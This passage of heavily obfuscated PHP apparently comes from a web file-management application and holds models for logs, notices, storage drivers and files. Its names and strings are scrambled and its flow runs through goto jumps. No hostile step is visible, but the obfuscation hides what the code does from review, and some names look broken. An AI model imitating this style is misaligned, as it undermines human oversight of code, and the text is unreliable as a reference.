$éº³Úêœ[$Ú½ÉÃ†™[88]]; $şØ„œŸŠ[] = $¹¢¾ğ×ß[$Ú½ÉÃ†™[405]] = $àÍßøğ·[$Ú½ÉÃ†™[405]]; $şØ„œŸŠ[] = $¹¢¾ğ×ß[$Ú½ÉÃ†™[2018]] = $àÍßøğ·[$Ú½ÉÃ†™[500]]; break; } return $¹¢¾ğ×ß; } private function getSourceList(&$İøµà £) { $˜íà¹êê =& $_SERVER[ë¦»ºéÌ]; $ö¢ïñÄÃ = array(); foreach ($İøµà £ as $¥ğú¬Ö› => $êÎõÊğİ) { $¼‚¡³° = json_decode($êÎõÊğİ[$˜íà¹êê[453]], !0); if ($êÎõÊğİ[$˜íà¹êê[43]] == $˜íà¹êê[1774]) { $¼‚¡³° = $this->descZipDownload($¼‚¡³°, $ö¢ïñÄÃ); $İøµà £[$¥ğú¬Ö›][$˜íà¹êê[453]] = json_encode($¼‚¡³°); continue; } if (strpos($êÎõÊğİ[$˜íà¹êê[43]], $˜íà¹êê[2020]) !== 0) { if (!isset($¼‚¡³°[$˜íà¹êê[88]]) || strpos($êÎõÊğİ[$˜íà¹êê[43]], $˜íà¹êê[2210]) !== 0) { continue; } try { $´Ûà˜ò = IO::infoFull($¼‚¡³°[$˜íà¹êê[88]]); } catch (Exception $ŞŒö›Ä) { continue; } $ö¢ïñÄÃ[] = $¼‚¡³°[$˜íà¹êê[405]] = $´Ûà˜ò[$˜íà¹êê[405]]; $ö¢ïñÄÃ[] = $¼‚¡³°[$˜íà¹êê[2018]] = $´Ûà˜ò[$˜íà¹êê[500]]; $İøµà £[$¥ğú¬Ö›][$˜íà¹êê[453]] = json_encode($¼‚¡³°); continue; } $ö¢ïñÄÃ[] = $¼‚¡³°[$˜íà¹êê[405]]; $ö¢ïñÄÃ[] = $¼‚¡³°[$˜íà¹êê[2018]]; if ($¼‚¡³°[$˜íà¹êê[43]] == $˜íà¹êê[553]) { $ö¢ïñÄÃ[] = $¼‚¡³°[$˜íà¹êê[453]][$˜íà¹êê[1138]]; $ö¢ïñÄÃ[] = $¼‚¡³°[$˜íà¹êê[453]][$˜íà¹êê[1139]]; } if ($¼‚¡³°[$˜íà¹êê[43]] == $˜íà¹êê[2027]) { $ö¢ïñÄÃ[] = $¼‚¡³°[$˜íà¹êê[453]][$˜íà¹êê[405]]; } } if (!$ö¢ïñÄÃ) { return array(); } return Model($˜íà¹êê[809])->sourceListInfo($ö¢ïñÄÃ, !0); } private function logList($¼ÚÔÆŸ) { $„ÊÌ…Œ˜ =& $_SERVER[ë¦»ºéÌ]; $©¿í®£» = array_to_keyvalue($¼ÚÔÆŸ, $„ÊÌ…Œ˜[12], $„ÊÌ…Œ˜[1632]); $ùï¨¶À— = Model($„ÊÌ…Œ˜[540])->userListInfo(array_unique($©¿í®£»)); $˜´ä”¼ = $this->getSourceList($¼ÚÔÆŸ); $»èŞàŸ = $this->typeAll(); $ËÛ•îüõ = array(); $€²ïÑœ¨ = array(); foreach ($¼ÚÔÆŸ as $çÇ‡ü²… => $ÅÚ”®Ÿö) { $ÇËãüˆ¹ = $ÅÚ”®Ÿö[$„ÊÌ…Œ˜[43]]; $æ˜ê…å³ = isset($ùï¨¶À—[$ÅÚ”®Ÿö[$„ÊÌ…Œ˜[1632]]]) ? $ùï¨¶À—[$ÅÚ”®Ÿö[$„ÊÌ…Œ˜[1632]]] : !1; $ÔÍãÅëÆ = strpos($ÇËãüˆ¹, $„ÊÌ…Œ˜[2211]) === 0 ? LNG($„ÊÌ…Œ˜[2212]) : LNG($„ÊÌ…Œ˜[2207]); $ÅÚ”®Ÿö[$„ÊÌ…Œ˜[42]] = isset($æ˜ê…å³[$„ÊÌ…Œ˜[42]]) ? $æ˜ê…å³[$„ÊÌ…Œ˜[42]] : LNG($„ÊÌ…Œ˜[2207]); $ÅÚ”®Ÿö[$„ÊÌ…Œ˜[2068]] = isset($æ˜ê…å³[$„ÊÌ…Œ˜[2068]]) ? $æ˜ê…å³[$„ÊÌ…Œ˜[2068]] : $„ÊÌ…Œ˜[12]; $ÅÚ”®Ÿö[$„ÊÌ…Œ˜[1532]] = isset($»èŞàŸ[$ÇËãüˆ¹]) ? $»èŞàŸ[$ÇËãüˆ¹] : $ÔÍãÅëÆ; $ÅÚ”®Ÿö[$„ÊÌ…Œ˜[1963]] = $æ˜ê…å³; $Û§‡Ê¢ = json_decode($ÅÚ”®Ÿö[$„ÊÌ…Œ˜[453]], !0); $ÅÚ”®Ÿö[$„ÊÌ…Œ˜[2204]] = isset($Û§‡Ê¢[$„ÊÌ…Œ˜[2204]]) ? $Û§‡Ê¢[$„ÊÌ…Œ˜[2204]] : $„ÊÌ…Œ˜[12]; $ÅÚ”®Ÿö[$„ÊÌ…Œ˜[2208]] = IpLocation::get($ÅÚ”®Ÿö[$„ÊÌ…Œ˜[2204]]); if (strpos($ÇËãüˆ¹, $„ÊÌ…Œ˜[2020]) === 0 || isset($Û§‡Ê¢[$„ÊÌ…Œ˜[2018]])) { $Û§‡Ê¢[$„ÊÌ…Œ˜[97]] = $˜´ä”¼[$Û§‡Ê¢[$„ÊÌ…Œ˜[405]]]; $Û§‡Ê¢[$„ÊÌ…Œ˜[2032]] = $˜´ä”¼[$Û§‡Ê¢[$„ÊÌ…Œ˜[2018]]]; if ($Û§‡Ê¢[$„ÊÌ…Œ˜[43]] == $„ÊÌ…Œ˜[553]) { $Û§‡Ê¢[$„ÊÌ…Œ˜[453]][$„ÊÌ…Œ˜[1138]] = $˜´ä”¼[$Û§‡Ê¢[$„ÊÌ…Œ˜[453]][$„ÊÌ…Œ˜[1138]]]; $Û§‡Ê¢[$„ÊÌ…Œ˜[453]][$„ÊÌ…Œ˜[1139]] = $˜´ä”¼[$Û§‡Ê¢[$„ÊÌ…Œ˜[453]][$„ÊÌ…Œ˜[1139]]]; } if ($Û§‡Ê¢[$„ÊÌ…Œ˜[43]] == $„ÊÌ…Œ˜[2027]) { $Û§‡Ê¢[$„ÊÌ…Œ˜[453]][$„ÊÌ…Œ˜[405]] = $˜´ä”¼[$Û§‡Ê¢[$„ÊÌ…Œ˜[453]][$„ÊÌ…Œ˜[405]]]; } if ($Û§‡Ê¢[$„ÊÌ…Œ˜[43]] == $„ÊÌ…Œ˜[1769]) { $Û§‡Ê¢[$„ÊÌ…Œ˜[2032]] = $Û§‡Ê¢[$„ÊÌ…Œ˜[97]]; $Û§‡Ê¢[$„ÊÌ…Œ˜[2018]] = $Û§‡Ê¢[$„ÊÌ…Œ˜[2032]][$„ÊÌ…Œ˜[405]]; $Û§‡Ê¢[$„ÊÌ…Œ˜[97]] = !1; $Û§‡Ê¢[$„ÊÌ…Œ˜[405]] = $„ÊÌ…Œ˜[12]; } if ($Û§‡Ê¢[$„ÊÌ…Œ˜[97]] && $Û§‡Ê¢[$„ÊÌ…Œ˜[97]][$„ÊÌ…Œ˜[414]] == $„ÊÌ…Œ˜[1254]) { $€²ïÑœ¨[] = $ÅÚ”®Ÿö[$„ÊÌ…Œ˜[403]]; unset($¼ÚÔÆŸ[$çÇ‡ü²…]); continue; } if ($Û§‡Ê¢[$„ÊÌ…Œ˜[2032]] && $Û§‡Ê¢[$„ÊÌ…Œ˜[2032]][$„ÊÌ…Œ˜[414]] == $„ÊÌ…Œ˜[1254]) { $€²ïÑœ¨[] = $ÅÚ”®Ÿö[$„ÊÌ…Œ˜[403]]; unset($¼ÚÔÆŸ[$çÇ‡ü²…]); continue; } } $ÅÚ”®Ÿö[$„ÊÌ…Œ˜[453]] = $Û§‡Ê¢; unset($ÅÚ”®Ÿö[$„ÊÌ…Œ˜[2213]]); $ËÛ•îüõ[] = $ÅÚ”®Ÿö; } $this->clearSystemPathLog($€²ïÑœ¨); return $ËÛ•îüõ; } private function clearSystemPathLog($ˆÒ¤šİá) { $ã†××Ç =& $_SERVER[ë¦»ºéÌ]; if (count($ˆÒ¤šİá) == 0) { return; } $‹¨­¹ĞÄ = array($ã†××Ç[403] => array($ã†××Ç[7], array_unique($ˆÒ¤šİá))); $this->where($‹¨­¹ĞÄ)->delete(); } public function deviceList($Ò´šÖÍç, $€œæäş = 0) { $îÄÁÀıß =& $_SERVER[ë¦»ºéÌ]; $¢øÑåÜ = array($îÄÁÀıß[1632] => $Ò´šÖÍç, $îÄÁÀıß[205] => array($îÄÁÀıß[994], $€œæäş), $îÄÁÀıß[43] => $îÄÁÀıß[1743]); $’¾•¼µ… = array(); $„¢¢Ì² = $this->field($îÄÁÀıß[2214])->where($¢øÑåÜ)->order($îÄÁÀıß[2030])->limit(50)->select(); foreach ($„¢¢Ì² as $ğ®³”ÍÜ => $Ï‰„Ø÷ï) { if ($ğ®³”ÍÜ > 0 && abs($Ï‰„Ø÷ï[$îÄÁÀıß[205]] - $„¢¢Ì²[$ğ®³”ÍÜ - 1][$îÄÁÀıß[205]]) < 5) { continue; } $ÎÃÇö… = json_decode($Ï‰„Ø÷ï[$îÄÁÀıß[453]], !0); $Ï‰„Ø÷ï[$îÄÁÀıß[2204]] = isset($ÎÃÇö…[$îÄÁÀıß[2204]]) ? $ÎÃÇö…[$îÄÁÀıß[2204]] : $îÄÁÀıß[12]; unset($ÎÃÇö…[$îÄÁÀıß[2204]]); $Åúˆ„´Â = $this->deviceType($ÎÃÇö…[$îÄÁÀıß[2021]]); if (isset($’¾•¼µ…[$Åúˆ„´Â])) { continue; } $Ï‰„Ø÷ï[$îÄÁÀıß[2208]] = IpLocation::get($Ï‰„Ø÷ï[$îÄÁÀıß[2204]]); $Ï‰„Ø÷ï[$îÄÁÀıß[453]] = $ÎÃÇö…; $’¾•¼µ…[$Åúˆ„´Â] = $Ï‰„Ø÷ï; } return array_values($’¾•¼µ…); } public function deviceType($ªÖ€ß±æ) { return $ªÖ€ß±æ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\x2e\x6e\x6f\x74\x69\x63\145\114\151\x73\164"; public $field = array("\156\x61\x6d\145", "\143\157\x6e\164\x65\x6e\164", "\141\x75\164\x68", "\x6d\x6f\144\x65", "\x74\151\x6d\145", "\x74\x79\x70\x65", "\x6c\145\x76\x65\x6c", "\145\x6e\x61\142\154\x65", "\x73\x6f\162\164"); public function listData($çÃß´­ = false, $œ¥Ö¢§§ = "\x73\x6f\162\164", $›ĞĞ±Ûì = false) { return parent::listData($çÃß´­, $œ¥Ö¢§§, $›ĞĞ±Ûì); } public function add($¦·ÎŸÕ’) { $Â´´€Ñ =& $_SERVER[ë¦»ºéÌ]; $ä¥ŒšÎ = time(); if ($¦·ÎŸÕ’[$Â´´€Ñ[26]] == $Â´´€Ñ[2215]) { $ä¥ŒšÎ = strtotime($¦·ÎŸÕ’[$Â´´€Ñ[208]]); } $¦·ÎŸÕ’[$Â´´€Ñ[208]] = $ä¥ŒšÎ; return parent::insert($¦·ÎŸÕ’); } public function update($ğ‰â¦«´, $ÓØ ¸™«) { $îÁÕå‚ =& $_SERVER[ë¦»ºéÌ]; $“’¶²Ì± = $this->listData($ğ‰â¦«´); if (!$“’¶²Ì±) { return !1; } $Ïê‹ä¯ = time(); if ($ÓØ ¸™«[$îÁÕå‚[26]] == $îÁÕå‚[2215]) { $Ïê‹ä¯ = strtotime($ÓØ ¸™«[$îÁÕå‚[208]]); } $ÓØ ¸™«[$îÁÕå‚[208]] = $Ïê‹ä¯; return parent::update($ğ‰â¦«´, $ÓØ ¸™«); } public function remove($«ÛßÒ) { $œæ¾Ô¥§ = $this->listData($«ÛßÒ); if (!$œæ¾Ô¥§ || $œæ¾Ô¥§[$_SERVER[ë¦»ºéÌ][1254]]) { return !1; } return parent::remove($«ÛßÒ); } public function sort($ñÒ¨¡ïÁ, $ï¤®¾²Õ) { return parent::update($ñÒ¨¡ïÁ, $ï¤®¾²Õ); } public function enable($–´úş¿†, $ÙôêÌÑ) { return parent::update($–´úş¿†, array($_SERVER[ë¦»ºéÌ][2216] => $ÙôêÌÑ)); } private function initUserOption() { $ì¿üÚ =& $_SERVER[ë¦»ºéÌ]; $this->optionType = $ì¿üÚ[2217]; $this->modelType = $ì¿üÚ[2218]; $this->field = array($ì¿üÚ[2219], $ì¿üÚ[42], $ì¿üÚ[208], $ì¿üÚ[43], $ì¿üÚ[2220], $ì¿üÚ[734], $ì¿üÚ[200]); } public function userNoticeGet($¾èÉŒÔŒ = false) { $this->initUserOption(); return parent::listData($¾èÉŒÔŒ, $_SERVER[ë¦»ºéÌ][403], !0); } public function userNoticeAdd($†öı¹…ã) { $‘É²¡ìë =& $_SERVER[ë¦»ºéÌ]; $this->initUserOption(); $ÌˆôÏÖ§ = $this->findByKey($‘É²¡ìë[2219], $†öı¹…ã[$‘É²¡ìë[403]]); if ($ÌˆôÏÖ§) { return !0; } $çäÄŸäú = array($‘É²¡ìë[2219] => $†öı¹…ã[$‘É²¡ìë[403]], $‘É²¡ìë[42] => $†öı¹…ã[$‘É²¡ìë[42]], $‘É²¡ìë[208] => $†öı¹…ã[$‘É²¡ìë[208]], $‘É²¡ìë[43] => isset($†öı¹…ã[$‘É²¡ìë[43]]) ? $†öı¹…ã[$‘É²¡ìë[43]] : 1, $‘É²¡ìë[2220] => isset($†öı¹…ã[$‘É²¡ìë[2220]]) ? $†öı¹…ã[$‘É²¡ìë[2220]] : 0, $‘É²¡ìë[734] => 0, $‘É²¡ìë[200] => 0); return parent::insert($çäÄŸäú); } public function userNoticeEdit($åãë÷öì, $¯”ì·á³) { $this->initUserOption(); return parent::update($åãë÷öì, $¯”ì·á³); } } $_file = $_SERVER[$_SERVER[ë¦»ºéÌ][22]]; goto e“‘í½ò„ç; bŞäöíèºò: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\56\x73\x6f\165\x72\143\x65\x53\x65\x63\162\145\x74\114\151\163\164"; public $field = array("\x73\157\165\x72\143\145\111\x44", "\164\171\160\x65\x49\104", "\x63\162\x65\x61\x74\x65\x55\163\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\56\163\164\157\x72\x61\x67\x65\x4c\x69\163\164"; public $field = array("\x6e\141\155\145", "\163\151\x7a\145\x4d\141\x78", "\x73\171\163\164\145\x6d", "\144\x65\146\141\165\154\164", "\x64\x72\151\166\145\162", "\143\157\x6e\x66\151\147"); public function listData($âŞ™® ¢ = false, $Ÿû›ëœ = "\155\157\x64\x69\146\x79\124\151\155\145", $ê­ˆêîÄ = false) { $—ïÒı‘» =& $_SERVER[ë¦»ºéÌ]; $³Ù’Ãş = parent::listData($âŞ™® ¢, $Ÿû›ëœ, $ê­ˆêîÄ); if ($âŞ™® ¢) { return $³Ù’Ãş; } $÷ƒå´×‚ = $this->ioSizeUseGet(array_to_keyvalue($³Ù’Ãş, $—ïÒı‘»[12], $—ïÒı‘»[403])); foreach ($³Ù’Ãş as $­‚×š— => $ú Å´Ù–) { unset($³Ù’Ãş[$­‚×š—][$—ïÒı‘»[6]]); $³Ù’Ãş[$­‚×š—][$—ïÒı‘»[1789]] = isset($÷ƒå´×‚[$ú Å´Ù–[$—ïÒı‘»[403]]]) ? $÷ƒå´×‚[$ú Å´Ù–[$—ïÒı‘»[403]]] : 0; } return $³Ù’Ãş; } public function ioSizeUseGet($³ØÙÜ©ï) { $ôšü·Å =& $_SERVER[ë¦»ºéÌ]; if (!$³ØÙÜ©ï) { return array(); } $¦€ˆÁúÛ = $ôšü·Å[2104] . implode($ôšü·Å[60], $³ØÙÜ©ï); $ÛöŒ‚ä° = Cache::get($¦€ˆÁúÛ); if ($ÛöŒ‚ä°) { return $ÛöŒ‚ä°; } $¹·ÍÊ– = array($ôšü·Å[801] => $ôšü·Å[403], $ôšü·Å[2105] => $ôšü·Å[90]); $İšı­Ø¢ = array($ôšü·Å[801] => array($ôšü·Å[7], $³ØÙÜ©ï)); $ÛöŒ‚ä° = Model($ôšü·Å[773])->field($¹·ÍÊ–)->where($İšı­Ø¢)->group($ôšü·Å[801])->select(); $ÛöŒ‚ä° = array_to_keyvalue($ÛöŒ‚ä°, $ôšü·Å[403], $ôšü·Å[90]); Cache::set($¦€ˆÁúÛ, $ÛöŒ‚ä°, 600); return $ÛöŒ‚ä°; } public function getConfig($èÔŞê½ç) { $»¾›Ô÷ò = parent::listData($èÔŞê½ç); return json_decode($»¾›Ô÷ò[$_SERVER[ë¦»ºéÌ][6]], !0); } public function update($Ô»‹³¢ğ, $™³ÊäÇĞ) { $û­Ğ²Š¸ =& $_SERVER[ë¦»ºéÌ]; $ˆÅÅ±ÀÚ = $™³ÊäÇĞ[$û­Ğ²Š¸[42]]; $‘¦ÕÑÃò = array_to_keyvalue(parent::listData(), $û­Ğ²Š¸[42]); if (isset($‘¦ÕÑÃò[$ˆÅÅ±ÀÚ]) && $‘¦ÕÑÃò[$ˆÅÅ±ÀÚ][$û­Ğ²Š¸[403]] != $Ô»‹³¢ğ) { return !1; } if (isset($™³ÊäÇĞ[$û­Ğ²Š¸[2106]]) && $™³ÊäÇĞ[$û­Ğ²Š¸[2106]] == $û­Ğ²Š¸[99]) { $this->checkConfig($™³ÊäÇĞ); } unset($™³ÊäÇĞ[$û­Ğ²Š¸[2106]]); $äÖ¶âÅó = parent::update($Ô»‹³¢ğ, $™³ÊäÇĞ); if ($äÖ¶âÅó && $™³ÊäÇĞ[$û­Ğ²Š¸[47]]) { foreach ($‘¦ÕÑÃò as $Ó×‰ß—ø) { if ($Ó×‰ß—ø[$û­Ğ²Š¸[47]] && $Ó×‰ß—ø[$û­Ğ²Š¸[403]] != $Ô»‹³¢ğ) { parent::update($Ó×‰ß—ø[$û­Ğ²Š¸[403]], array($û­Ğ²Š¸[47] => 0)); } } } return $äÖ¶âÅó; } public function add($ûÌ†Œºù) { $ëßØ±ÏŞ =& $_SERVER[ë¦»ºéÌ]; $¯‡Ø±ïº = array_to_keyvalue(parent::listData(), $ëßØ±ÏŞ[42]); if (isset($¯‡Ø±ïº[$ûÌ†Œºù[$ëßØ±ÏŞ[42]]])) { return !1; } $this->checkConfig($ûÌ†Œºù); $°•ëå¡ = parent::insert($ûÌ†Œºù); if ($°•ëå¡ && $ûÌ†Œºù[$ëßØ±ÏŞ[47]]) { foreach ($¯‡Ø±ïº as $´şÔ¢ÂÄ) { if ($´şÔ¢ÂÄ[$ëßØ±ÏŞ[47]]) { parent::update($´şÔ¢ÂÄ[$ëßØ±ÏŞ[403]], array($ëßØ±ÏŞ[47] => 0)); } } } return $°•ëå¡; } public function checkConfig(&$°†Ëûª, $ì§Š» = false) { $ÅŸàâ¦³ =& $_SERVER[ë¦»ºéÌ]; $²¶Ê¬‚‹ = strtolower($°†Ëûª[$ÅŸàâ¦³[106]]); $ñº­Å§ú = json_decode($°†Ëûª[$ÅŸàâ¦³[6]], !0); foreach ($ñº­Å§ú as $¡¹çºÏº => $İ÷·ÁÍï) { $ñº­Å§ú[$¡¹çºÏº] = trim($İ÷·ÁÍï); } $ñº­Å§ú[$ÅŸàâ¦³[2107]] = rand_string(6); $‡°ˆ»Û = $GLOBALS[$ÅŸàâ¦³[6]][$ÅŸàâ¦³[100]][$ÅŸàâ¦³[810]]; $´à†„œ© = isset($‡°ˆ»Û[$²¶Ê¬‚‹]) ? $‡°ˆ»Û[$²¶Ê¬‚‹] : ucfirst($²¶Ê¬‚‹); $úµ¶éÚÚ = $ÅŸàâ¦³[84] . $´à†„œ©; if (!$´à†„œ© || !class_exists($úµ¶éÚÚ)) { if ($ì§Š») { return LNG($ÅŸàâ¦³[2108]); } write_log(array($ÅŸàâ¦³[2109], $°†Ëûª, get_caller_info()), $ÅŸàâ¦³[2110]); show_json(LNG($ÅŸàâ¦³[2108]), !1, $°†Ëûª); } $–±ÌÙ‡ = new $úµ¶éÚÚ($ñº­Å§ú); if (in_array($²¶Ê¬‚‹, $–±ÌÙ‡->objectDriver)) { if (!$–±ÌÙ‡->isBucketCors() && !$–±ÌÙ‡->setBucketCors()) { $Ğ‚äÊ²‰ = LNG($ÅŸàâ¦³[2111]); $Ğ‚äÊ²‰ .= $ÅŸàâ¦³[2112] . LNG($ÅŸàâ¦³[2113]); if ($ì§Š») { return $Ğ‚äÊ²‰; } show_json($Ğ‚äÊ²‰, !1); } } $—ŠìÏİİ = rtrim($ñº­Å§ú[$ÅŸàâ¦³[1159]], $ÅŸàâ¦³[8]) . $ÅŸàâ¦³[8]; $³ë­§¡å = $–±ÌÙ‡->getPath($—ŠìÏİİ . $ÅŸàâ¦³[1221]); if (!$–±ÌÙ‡->mkfile($³ë­§¡å)) { if ($ì§Š») { return LNG($ÅŸàâ¦³[2111]); } show_json(LNG($ÅŸàâ¦³[2111]), !1); } $ñº­Å§ú[$ÅŸàâ¦³[1159]] = $—ŠìÏİİ; $°†Ëûª[$ÅŸàâ¦³[6]] = json_encode($ñº­Å§ú); $°†Ëûª[$ÅŸàâ¦³[106]] = $´à†„œ©; return !0; } public function driverListSystem() { $®ÀèõóÃ =& $_SERVER[ë¦»ºéÌ]; $ğ‚­œËˆ = parent::listData(); $”Èöï¢ø = array(); foreach ($ğ‚­œËˆ as $½ˆÙ©Áß) { unset($½ˆÙ©Áß[$®ÀèõóÃ[205]], $½ˆÙ©Áß[$®ÀèõóÃ[96]]); $½ˆÙ©Áß[$®ÀèõóÃ[6]] = json_decode($½ˆÙ©Áß[$®ÀèõóÃ[6]], !0); $”Èöï¢ø[] = $½ˆÙ©Áß; } return $”Èöï¢ø; } public function defaultDriver() { $Êµ–îŒ€ =& $_SERVER[ë¦»ºéÌ]; $º‘¿‰ü = parent::listData(); $›ûŞç© = array_filter_by_field($º‘¿‰ü, $Êµ–îŒ€[47], 1); $›ûŞç© = $›ûŞç©[0]; if ($›ûŞç©) { $›ûŞç©[$Êµ–îŒ€[6]] = json_decode($›ûŞç©[$Êµ–îŒ€[6]], !0); } return $›ûŞç©; } public function driverInfo($¼¬©Ñë×) { $¿ë˜Ä® =& $_SERVER[ë¦»ºéÌ]; $…”ğ² = array_to_keyvalue(parent::listData(), $¿ë˜Ä®[403]); if (!isset($…”ğ²[$¼¬©Ñë×])) { return !1; } $Âêİ§Ÿ‘ = $…”ğ²[$¼¬©Ñë×]; $Âêİ§Ÿ‘[$¿ë˜Ä®[6]] = json_decode($Âêİ§Ÿ‘[$¿ë˜Ä®[6]], !0); return $Âêİ§Ÿ‘; } public function remove($Ì÷ªßÖà) { $this->removeShareItems($Ì÷ªßÖà); return parent::remove($Ì÷ªßÖà); } public function removeWithFile($áíùƒ÷ú, $À¼šª¹û) { $üºãáâ =& $_SERVER[ë¦»ºéÌ]; $¤üÚâµ» = array($üºãáâ[801] => $áíùƒ÷ú); $‰ìªîù¯ = Model($üºãáâ[472])->where($¤üÚâµ»)->count(); $£‹î™‚ë = Model($üºãáâ[472])->where($¤üÚâµ»)->sum($üºãáâ[90]); $Àíœ…±à = $À¼šª¹û . $üºãáâ[2114] . $áíùƒ÷ú; $‹·®Êµì = LNG($À¼šª¹û == $üºãáâ[553] ? $üºãáâ[2115] : $üºãáâ[2116]); $‡ÎÊœ¨ = new TaskFileTransfer($Àíœ…±à, $üºãáâ[2110], $‰ìªîù¯, $‹·®Êµì . "\50{$áíùƒ÷ú}\x29"); $‡ÎÊœ¨->task[$üºãáâ[747]] = (double) $£‹î™‚ë; $ãÏíÍÑ­ = KodIO::defaultDriver(); $à²æ®İ½ = $ãÏíÍÑ­[$üºãáâ[403]]; $ÖÕŸå¤ = "\173\x69\157\x3a{$à²æ®İ½}\175\57"; $ÁùÒº” = !0; $îÍÁ®âû = array(); $÷ÍéÛ‡ß = Model($üºãáâ[204])->where($¤üÚâµ»)->field($üºãáâ[2117])->select(); foreach ($÷ÍéÛ‡ß as $«òòĞÃ¹) { $ğ£´š¨é = $«òòĞÃ¹[$üºãáâ[88]]; $¾ª™º‚µ = $ÖÕŸå¤ . str_replace("\173\151\x6f\72{$áíùƒ÷ú}\x7d\57", $üºãáâ[12], $ğ£´š¨é); if (!IO::exist($ğ£´š¨é)) { $îÍÁ®âû[] = $«òòĞÃ¹[$üºãáâ[469]]; $‡ÎÊœ¨->updateFileEnd($«òòĞÃ¹[$üºãáâ[42]], $«òòĞÃ¹[$üºãáâ[90]]); continue; } if (IO::exist($¾ª™º‚µ)) { $‡ÎÊœ¨->updateFileEnd($«òòĞÃ¹[$üºãáâ[42]], $«òòĞÃ¹[$üºãáâ[90]]); continue; } if (!IO::move($ğ£´š¨é, get_path_father($¾ª™º‚µ))) { $ÁùÒº” = !1; break; } $¤üÚâµ» = array($üºãáâ[469] => $«òòĞÃ¹[$üºãáâ[469]]); $¥°ºéä’ = array($üºãáâ[801] => $à²æ®İ½, $üºãáâ[88] => $¾ª™º‚µ); Model($üºãáâ[204])->where($¤üÚâµ»)->save($¥°ºéä’); } $this->removeByFileID($îÍÁ®âû); if (!$ÁùÒº”) { $‡ÎÊœ¨->stop($Àíœ…±à); return !1; } $‡ÎÊœ¨->end(); if ($À¼šª¹û == $üºãáâ[1769]) { $this->remove($áíùƒ÷ú); } } public function progress($‹×Ô£½«, $Æ“–îñ£) { return Task::get($Æ“–îñ£ . $_SERVER[ë¦»ºéÌ][2114] . $‹×Ô£½«); } private function removeByFileID($¶È«½Ü€ = array()) { $Í¼• ¬ =& $_SERVER[ë¦»ºéÌ]; if (empty($¶È«½Ü€)) { return; } $ÔÎ„ë– = array($Í¼• ¬[469] => array($Í¼• ¬[7], $¶È«½Ü€)); $œå‘’Éæ = Model($Í¼• ¬[1305])->where($ÔÎ„ë–)->field($Í¼• ¬[405])->select(); if (!$œå‘’Éæ) { return; } $œå‘’Éæ = array_to_keyvalue($œå‘’Éæ, $Í¼• ¬[12], $Í¼• ¬[405]); foreach ($œå‘’Éæ as $¨é¾º—å) { Model($Í¼• ¬[419])->removeNow($¨é¾º—å, !1); } } private function removeShareItems($»ÀƒœÊú) { $½ÚºÔ…Ñ =& $_SERVER[ë¦»ºéÌ]; $¬ªÕâ›Ò = "\x7b\151\x6f\x3a{$»ÀƒœÊú}\175\x2f"; $·¸åï…õ = array($½ÚºÔ…Ñ[405] => 0, $½ÚºÔ…Ñ[1154] => array($½ÚºÔ…Ñ[389], "{$¬ªÕâ›Ò}\45")); $¼®ç´é = Model($½ÚºÔ…Ñ[1780])->where($·¸åï…õ)->field($½ÚºÔ…Ñ[490])->select(); if (empty($¼®ç´é)) { return; } $€ÅÂ¸éØ = array_to_keyvalue($¼®ç´é, $½ÚºÔ…Ñ[12], $½ÚºÔ…Ñ[490]); Model($½ÚºÔ…Ñ[597])->remove($€ÅÂ¸éØ); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\x4c\x69\x67\x68\x74\x41\160\160"; public $modelType = "\x53\171\x73\x74\145\x6d\117\x70\164\x69\x6f\156"; public $field = array("\x6e\x61\155\x65", "\x67\162\x6f\x75\x70", "\x64\x65\x73\143", "\x63\157\156\164\145\x6e\x74"); public function listData($ƒÌè‹§Ë = false, $ò¨Ö±³ = "\x6d\x6f\x64\151\x66\x79\124\x69\x6d\x65", $ğµşÚîİ = true) { return parent::listData($ƒÌè‹§Ë, $ò¨Ö±³, $ğµşÚîİ); } public function remove($É³ç° ´) { $¾êÌØ = $this->findByName($É³ç° ´); if (!$¾êÌØ) { return !1; } return parent::remove($¾êÌØ[$_SERVER[ë¦»ºéÌ][403]]); } public function add($Ñ¦Ùï¨) { if ($this->findByName($Ñ¦Ùï¨[$_SERVER[ë¦»ºéÌ][42]])) { return !1; } return parent::insert($Ñ¦Ùï¨); } public function update($û¡¾¥Â‚, $ëÜåúÚ) { $¬ã‹øÎ =& $_SERVER[ë¦»ºéÌ]; $çŞŸÚì¥ = $this->findByName($û¡¾¥Â‚); $´¦™ûª‹ = $this->findByName($ëÜåúÚ[$¬ã‹øÎ[42]]); if (!$çŞŸÚì¥ || $´¦™ûª‹ && $´¦™ûª‹[$¬ã‹øÎ[403]] != $çŞŸÚì¥[$¬ã‹øÎ[403]]) { return !1; } return parent::update($çŞŸÚì¥[$¬ã‹øÎ[403]], $ëÜåúÚ); } } goto E¡ßšˆ°¡ó; e¹à‹°‡Ì: class FileModel extends ModelBase { protected $tableName = "\x69\157\137\146\x69\x6c\145"; protected $tableMeta = array("\x74\x61\x62\154\x65\x4e\141\155\145" => "\x69\x6f\137\146\x69\x6c\145\x5f\155\x65\164\x61", "\x6d\145\164\x61\x46\151\145\x6c\x64" => "\x66\151\x6c\x65\x49\104"); public function fileInfo($¹¤ºÌ¯¥) { $†í¼¬É =& $_SERVER[ë¦»ºéÌ]; static $¤Â‘‚Ê× = array(); if (!isset($¤Â‘‚Ê×[$¹¤ºÌ¯¥])) { $Ì·Øß˜é = $†í¼¬É[1848]; $†ÄÚ—Ç² = Model($†í¼¬É[472])->field($Ì·Øß˜é)->where(array($†í¼¬É[470] => $¹¤ºÌ¯¥))->find(); $¤Â‘‚Ê×[$¹¤ºÌ¯¥] = $†ÄÚ—Ç²; } return $¤Â‘‚Ê×[$¹¤ºÌ¯¥]; } public function addFileByContent($äáß›å = '', $³ÓµÔ£¦ = '') { $Ô²“”¶Ù =& $_SERVER[ë¦»ºéÌ]; $èÉˆ¹¯µ = TEMP_PATH . $Ô²“”¶Ù[1849]; if (!is_dir($èÉˆ¹¯µ)) { mk_dir($èÉˆ¹¯µ); } $££’äÃÄ = $èÉˆ¹¯µ . $Ô²“”¶Ù[1850] . rand_string(16); file_put_contents($££’äÃÄ, $äáß›å); $‚°ÂãïŠ = $this->addFile($££’äÃÄ, $³ÓµÔ£¦, !0); if (file_exists($££’äÃÄ)) { @unlink($££’äÃÄ); } return $‚°ÂãïŠ; } public function createFileName($ö¨Òµşæ, $”»ª¸¡‡ = false, $õ»†é = false) { $ƒ²™º“” =& 